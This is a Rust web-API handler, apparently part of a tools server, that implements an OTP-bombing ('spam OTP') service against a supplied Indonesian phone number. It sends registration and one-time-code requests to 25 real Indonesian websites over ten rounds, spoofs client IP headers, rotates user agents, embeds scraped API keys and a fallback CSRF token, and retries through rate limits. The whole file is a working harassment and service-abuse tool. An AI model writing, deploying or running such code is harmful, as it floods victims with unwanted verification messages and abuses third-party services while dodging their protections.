// SpamOtp — native conversion of api/tools/spam-otp.js (25 ID services, 10 rounds background)
use axum::{
    extract::Query,
    response::{IntoResponse, Response},
    Json,
};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::Mutex;

use crate::state::AppState;
use reqwest::header;

const CONFIG_RETRIES: u32 = 2;
const CONFIG_TIMEOUT_SECS: u64 = 45;
const TOTAL_ROUNDS: u32 = 10;

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36",
];

const FALLBACK_CSRF: &str = "v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8";

fn uuid_v4() -> String {
    let b: [u8; 16] = rand::random();
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-4{:01x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        b[0], b[1], b[2], b[3], b[4], b[5], b[6] & 0x0f, b[7],
        (b[8] & 0x3f) | 0x80, b[9], b[10], b[11], b[12], b[13], b[14], b[15]
    )
}

fn random_ip() -> String {
    format!(
        "{}.{}.{}.{}",
        rand::random::<u8>().max(1),
        rand::random::<u8>().max(1),
        rand::random::<u8>().max(1),
        rand::random::<u8>().max(1)
    )
}
fn random_ua() -> &'static str {
    USER_AGENTS[rand::random::<usize>() % USER_AGENTS.len()]
}
fn rand_range(min: u32, max: u32) -> u32 {
    min + rand::random::<u32>() % (max - min + 1)
}
fn generate_email() -> String {
    let chars = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let r: String = (0..10)
        .map(|_| chars[rand::random::<usize>() % chars.len()] as char)
        .collect();
    format!("{}@bwmyga.com", r)
}
fn normalize_phone(phone: &str) -> String {
    let mut p: String = phone.chars().filter(|c| c.is_ascii_digit()).collect();
    if p.starts_with('0') {
        p = format!("62{}", &p[1..]);
    }
    if !p.starts_with("62") {
        p = format!("62{}", p);
    }
    p
}

struct TaskStatus {
    done: bool,
    total_rounds: u32,
    current_round: u32,
    total: u32,
    sent: u32,
    failed: u32,
    elapsed: Option<String>,
    error: Option<String>,
}

static TASK_CACHE: std::sync::OnceLock<Mutex<HashMap<String, TaskStatus>>> =
    std::sync::OnceLock::new();
fn task_cache() -> &'static Mutex<HashMap<String, TaskStatus>> {
    TASK_CACHE.get_or_init(|| Mutex::new(HashMap::new()))
}

async fn get_pinhome_csrf(client: &reqwest::Client) -> (String, String) {
    match client
        .get("https://www.pinhome.id/daftar")
        .header("User-Agent", random_ua())
        .header(
            "Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        )
        
        .send()
        .await
    {
        Ok(resp) => {
            let mut csrf_token = String::new();
            let mut cookie_string = String::new();
            for cv in resp.headers().get_all(reqwest::header::SET_COOKIE) {
                if let Ok(c) = cv.to_str() {
                    let name_value = c.split(';').next().unwrap_or("").to_string();
                    cookie_string.push_str(&format!("{}; ", name_value));
                    if name_value.contains("_X7kCsrf") {
                        if let Some(v) = name_value.split('=').nth(1) {
                            csrf_token = v.to_string();
                        }
                    }
                }
            }
            if csrf_token.is_empty() {
                if let Ok(html) = resp.text().await {
                    let re1 = regex::Regex::new(r#""csrfToken":"([^"]+)""#).ok();
                    let re2 = regex::Regex::new(r#"name="csrf-token" content="([^"]+)""#).ok();
                    if let Some(m) = re1
                        .and_then(|r| r.captures(&html))
                        .or_else(|| re2.and_then(|r| r.captures(&html)))
                    {
                        if let Some(t) = m.get(1) {
                            csrf_token = t.as_str().to_string();
                        }
                    }
                }
            }
            if csrf_token.is_empty() {
                csrf_token = FALLBACK_CSRF.into();
                cookie_string = format!(
                    "_X7kCsrf={}; _ga=GA1.1.1752313616.1783394371",
                    FALLBACK_CSRF
                );
            }
            (csrf_token, cookie_string)
        }
        Err(_) => (
            FALLBACK_CSRF.into(),
            format!(
                "_X7kCsrf={}; _ga=GA1.1.1752313616.1783394371",
                FALLBACK_CSRF
            ),
        ),
    }
}

struct Endpoint {
    url: String,
    data: Option<Value>,
    method: &'static str,
    headers: Vec<(String, String)>,
    form_encoded: bool,
}

async fn get_endpoints(client: &reqwest::Client, phone: &str) -> Vec<Endpoint> {
    let p08 = format!("0{}", &phone[2..]);
    let p62 = phone.to_string();
    let p_no_country = phone.strip_prefix("62").unwrap_or(phone).to_string();
    let device_id = uuid_v4();
    let request_id = uuid_v4();

    let (csrf, _cookie) = get_pinhome_csrf(client).await;
    let _ = csrf;

    vec![
        Endpoint {
            url: "https://api.maulagi.id/api/v2/auth/check".into(),
            data: Some(json!({"credentials": p62})),
            method: "POST",
            headers: vec![("X-ML-KEY".into(), "B10JLPEP10".into())],
            form_encoded: false,
        },
        Endpoint {
            url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation".into(),
            data: Some(json!({"mobileCountryCode": "", "mobileNumber": p08, "activationCode": ""})),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url:
                "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
                    .into(),
            data: Some(
                json!({"accountType": "customers", "applicationType": "Pinhome Web", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": p_no_country}),
            ),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://internetrakyat.id/api/app/auth/send-otp-register".into(),
            data: Some(json!({"phone_number": p08})),
            method: "POST",
            headers: vec![("x-api-key".into(), "280999!FTTH".into())],
            form_encoded: false,
        },
        Endpoint {
            url: "https://www.bonusbelanja.com/api/auth/registration/app".into(),
            data: Some(
                json!({"phone": p62, "name": "User", "agreeTnc": true, "agreeContact": false}),
            ),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://www.alodokter.com/resend-otp".into(),
            data: Some(
                json!({"user": {"phone": p08, "uuid": uuid_v4()}, "request_via": "whatsapp"}),
            ),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://www.beautyhaul.com/ajax/account/send_otp".into(),
            data: Some(json!({"method": "WhatsApp", "phone": p62})),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id"
                .into(),
            data: Some(
                json!({"nama_lengkap": "User", "telepon": p08, "email": format!("user{}@mail.com", rand_range(1000, 9999))}),
            ),
            method: "POST",
            headers: vec![
                ("Xid".into(), rand_range(1000000, 9999999).to_string()),
                ("source".into(), "ocistok".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.duniagames.co.id/api/other/api/v1/content/".into(),
            data: None,
            method: "GET",
            headers: vec![
                ("Accept-Language".into(), "id".into()),
                ("x-device".into(), device_id),
                ("Ciam-Type".into(), "FR".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.dokterin.id/user/v1/users/login".into(),
            data: Some(json!({"phone": p62, "tnc_accept": true, "device_id": uuid_v4()})),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://dokterin.id".into()),
                ("Referer".into(), "https://dokterin.id/login".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.paper.id/api/v1/auth/login".into(),
            data: Some(json!({"method": "whatsapp", "phone": p08})),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://www.paper.id".into()),
                ("Referer".into(), "https://www.paper.id/".into()),
                (
                    "x-paper-user-agent".into(),
                    "Jupiter/7.19.5 desktop (windows) Firefox 152".into(),
                ),
                ("request-id".into(), request_id),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://cms.bunda.co.id/api/v1/auth/send-otp".into(),
            data: Some(json!({"phone_number": p62, "type": "auth"})),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://www.bunda.co.id".into()),
                ("Referer".into(), "https://www.bunda.co.id/id".into()),
                ("X-Requested-With".into(), "XMLHttpRequest".into()),
                ("X-Locale".into(), "id".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode".into(),
            data: Some(json!({"phone_number": p08})),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.indodax.com/api/v1/otp/send".into(),
            data: Some(
                json!({"email": generate_email(), "flow": "register", "method": "whatsapp", "old_uuid": ""}),
            ),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://indodax.com".into()),
                ("Referer".into(), "https://indodax.com/".into()),
                ("key".into(), "bAGUG2WiLy".into()),
                ("authorization".into(), "Bearer bAGUG2WiLy".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://saturdays.com/api/v1/auth/otp".into(),
            data: Some(json!({"phone": p62, "type": "register"})),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.saturdays.com/v2/user/otp/request".into(),
            data: Some(json!({"phoneNumber": p62, "channel": "whatsapp"})),
            method: "POST",
            headers: vec![],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.planetban.com/website/customer/request-otp".into(),
            data: Some(
                json!({"name": "Test", "phone": p08, "password": "Test123", "purpose": "register", "method": "whatsapp"}),
            ),
            method: "POST",
            headers: vec![("Origin".into(), "https://planetban.com".into())],
            form_encoded: false,
        },
        Endpoint {
            url: "https://www.rumah123.com/api/otp/request-otp".into(),
            data: Some(
                json!({"cancelledRequestId": rand_range(100000, 999999).to_string(), "ipAddress": random_ip(), "phoneNumber": p08, "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}),
            ),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://www.rumah123.com".into()),
                ("base-url-core".into(), "https://www.rumah123.com".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://register.paper.id/api/v1/auth/register/send-otp".into(),
            data: Some(
                json!({"phone": p08, "method": "whatsapp", "registered_by": "flutter mweb"}),
            ),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://paper.id".into()),
                (
                    "x-paper-user-agent".into(),
                    "multiverse/2.54.1 mobile_web (android) chrome".into(),
                ),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://www.hijup.com/sign_in".into(),
            data: Some(Value::String(format!(
                "[{{\"phone_number\":\"{}\",\"store_path\":\"hijup\"}}]",
                p08
            ))),
            method: "POST",
            headers: vec![
                ("Content-Type".into(), "text/plain;charset=UTF-8".into()),
                ("Origin".into(), "https://www.hijup.com".into()),
                (
                    "next-action".into(),
                    "b7eda6e749fbadcfcf226c2e36865091520b679f".into(),
                ),
                ("next-url".into(), "/sign_in".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://ohsome.co.id/api/member/user/random_code_check".into(),
            data: Some(
                json!({"country_code": "62", "account": p_no_country, "type_id": 2, "device_id": uuid_v4().replace('-', ""), "check_code": "219097", "image_id": "tcsRCTZ0RAvqQAvcUJDG"}),
            ),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://ohsome.co.id".into()),
                ("language".into(), "id".into()),
                ("x-store-no".into(), "SC001".into()),
                ("platform".into(), "H5".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://api.optikmelawai.com/api/v3/auth/register/1".into(),
            data: Some(json!({"phone": p08, "method": "whatsapp"})),
            method: "POST",
            headers: vec![
                ("Origin".into(), "https://www.optikmelawai.com".into()),
                ("language".into(), "id".into()),
            ],
            form_encoded: false,
        },
        Endpoint {
            url: "https://www.hollandbakery.co.id/resend-otp-register".into(),
            data: Some(json!({"phone": p08})),
            method: "POST",
            headers: vec![
                (
                    "Content-Type".into(),
                    "application/x-www-form-urlencoded".into(),
                ),
                ("Origin".into(), "https://www.hollandbakery.co.id".into()),
                (
                    "Referer".into(),
                    "https://www.hollandbakery.co.id/users/verify_token".into(),
                ),
            ],
            form_encoded: true,
        },
        Endpoint {
            url: "https://website-api.hashmicro.com/api/add/3".into(),
            data: Some(json!({"phone": p08, "type": "whatsapp"})),
            method: "POST",
            headers: vec![
                (
                    "Content-Type".into(),
                    "application/x-www-form-urlencoded".into(),
                ),
                ("Origin".into(), "https://www.hashmicro.com".into()),
            ],
            form_encoded: true,
        },
        Endpoint {
            url: "https://sso.rcx.co.id/auth/passwordless/request".into(),
            data: Some(json!({"phone": p08, "medium": "whatsapp"})),
            method: "POST",
            headers: vec![("Origin".into(), "https://rcx.co.id".into())],
            form_encoded: false,
        },
    ]
}

async fn send_request(client: &reqwest::Client, ep: &Endpoint) -> (&'static str, String) {
    let hostname = url::Url::parse(&ep.url)
        .ok()
        .and_then(|u| u.host_str().map(|h| h.to_string()))
        .unwrap_or_default();

    if ep.method != "GET" {
        tokio::time::sleep(std::time::Duration::from_millis(
            rand_range(3000, 5000) as u64
        ))
        .await;
    }

    for attempt in 0..=CONFIG_RETRIES {
        let mut req = client
            .request(
                if ep.method == "GET" {
                    reqwest::Method::GET
                } else {
                    reqwest::Method::POST
                },
                &ep.url,
            )
            .header("User-Agent", random_ua())
            .header("X-Forwarded-For", random_ip())
            .header("X-Real-IP", random_ip())
                        .header("Accept", "application/json, text/plain, */*")
                        .header("Accept-Language", "id-ID,id;q=0.9,en-US;q=0.8")
            .timeout(std::time::Duration::from_secs(CONFIG_TIMEOUT_SECS));
        for (k, v) in &ep.headers {
            req = req.header(k.as_str(), v.as_str());
        }
        if !ep
            .headers
            .iter()
            .any(|(k, _)| k.eq_ignore_ascii_case("content-type"))
            && ep.method != "GET"
        {
            req = req            .header("Content-Type", "application/json");
        }

        let req = if ep.method != "GET" {
            match (&ep.data, ep.form_encoded) {
                (Some(d), true) => {
                    let pairs: Vec<(String, String)> = d
                        .as_object()
                        .map(|o| {
                            o.iter()
                                .map(|(k, v)| {
                                    (
                                        k.clone(),
                                        v.as_str()
                                            .map(|s| s.to_string())
                                            .unwrap_or_else(|| v.to_string()),
                                    )
                                })
                                .collect()
                        })
                        .unwrap_or_default();
                    req.form(&pairs)
                }
                (Some(d), false) => {
                    if let Some(s) = d.as_str() {
                        req.body(s.to_string())
                    } else {
                        req.json(d)
                    }
                }
                _ => req,
            }
        } else {
            req
        };

        match req.send().await {
            Ok(res) => {
                let status = res.status();
                if status.is_success() {
                    return ("sent", hostname);
                }
                let body: Value = res.json().await.unwrap_or(Value::Null);
                if body
                    .get("success")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false)
                    || body.get("status").and_then(|v| v.as_str()) == Some("success")
                    || body.get("statusCode").and_then(|v| v.as_i64()) == Some(200)
                    || body
                        .get("message")
                        .and_then(|v| v.as_str())
                        .map(|m| {
                            m == "OTP terkirim" || m == "OTP sent successfully" || m == "Success."
                        })
                        .unwrap_or(false)
                    || body.get("secretCode").is_some()
                    || body.pointer("/data/new_uuid").is_some()
                {
                    return ("sent", hostname);
                }
                if status.as_u16() == 429 {
                    if attempt < CONFIG_RETRIES {
                        tokio::time::sleep(std::time::Duration::from_millis(
                            rand_range(30000, 45000) as u64,
                        ))
                        .await;
                    }
                    continue;
                }
            }
            Err(_) => {
                if attempt < CONFIG_RETRIES {
                    tokio::time::sleep(std::time::Duration::from_millis(
                        rand_range(5000, 8000) as u64
                    ))
                    .await;
                }
            }
        }
    }
    ("failed", hostname)
}

async fn run_background_task(client: reqwest::Client, phone: String) {
    let start = std::time::Instant::now();
    let endpoints = get_endpoints(&client, &phone).await;
    let total = (endpoints.len() as u32) * TOTAL_ROUNDS;

    {
        let mut cache = task_cache().lock().unwrap();
        cache.insert(
            phone.clone(),
            TaskStatus {
                done: false,
                total_rounds: TOTAL_ROUNDS,
                current_round: 1,
                total,
                sent: 0,
                failed: 0,
                elapsed: None,
                error: None,
            },
        );
    }

    let mut sent = 0u32;
    let mut failed = 0u32;
    let mut err: Option<String> = None;

    'outer: for round in 1..=TOTAL_ROUNDS {
        {
            let mut cache = task_cache().lock().unwrap();
            if let Some(t) = cache.get_mut(&phone) {
                t.current_round = round;
            }
        }
        for ep in &endpoints {
            match send_request(&client, ep).await {
                ("sent", _) => sent += 1,
                _ => failed += 1,
            }
            {
                let mut cache = task_cache().lock().unwrap();
                if let Some(t) = cache.get_mut(&phone) {
                    t.sent = sent;
                    t.failed = failed;
                }
            }
        }
        if round < TOTAL_ROUNDS {
            tokio::time::sleep(std::time::Duration::from_millis(
                rand_range(3000, 6000) as u64
            ))
            .await;
        }
    }

    let elapsed = format!("{:.1}", start.elapsed().as_secs_f32());
    let mut cache = task_cache().lock().unwrap();
    if let Some(t) = cache.get_mut(&phone) {
        t.done = true;
        t.elapsed = Some(elapsed);
        t.error = err.take();
    }
}

pub async fn handler(
    axum::extract::State(state): axum::extract::State<AppState>,
    Query(query): Query<HashMap<String, String>>,
    body: Option<Json<Value>>,
) -> Response {
    let get = |k: &str| {
        query.get(k).cloned().or_else(|| {
            body.as_ref().and_then(|b| b.get(k)).and_then(|v| {
                v.as_str().map(|s| s.to_string()).or_else(|| {
                    if v.is_null() {
                        None
                    } else {
                        Some(v.to_string())
                    }
                })
            })
        })
    };

    let target_phone = get("number").or_else(|| get("phone"));
    let target_phone = match target_phone {
        Some(p) if !p.trim().is_empty() => normalize_phone(p.trim()),
        _ => {
            return Json(json!({"status": false, "message": "Parameter 'number' wajib diisi"}))
                .into_response()
        }
    };

    let status_check = matches!(get("status").as_deref(), Some("true") | Some("1"));
    if status_check {
        let cache = task_cache().lock().unwrap();
        return match cache.get(&target_phone) {
            None => Json(json!({"status": true, "number": target_phone, "message": "Task belum dimulai atau sudah expired (TTL 15 menit)"})).into_response(),
            Some(t) => Json(json!({
                "status": true,
                "number": target_phone,
                "taskStatus": if t.done { "completed" } else { "running" },
                "currentRound": t.current_round,
                "totalRounds": t.total_rounds,
                "total": t.total,
                "sent": t.sent,
                "failed": t.failed,
                "elapsed": t.elapsed.as_ref().map(|e| format!("{}s", e)),
                "error": t.error,
            }))
            .into_response(),
        };
    }

    tokio::spawn(run_background_task(
        state.client.clone(),
        target_phone.clone(),
    ));

    Json(json!({
        "status": true,
        "number": target_phone,
        "message": "Spam OTP 10x batch started in background. Check status using ?number=x&status=true",
        "totalRounds": TOTAL_ROUNDS,
    })).into_response()

}
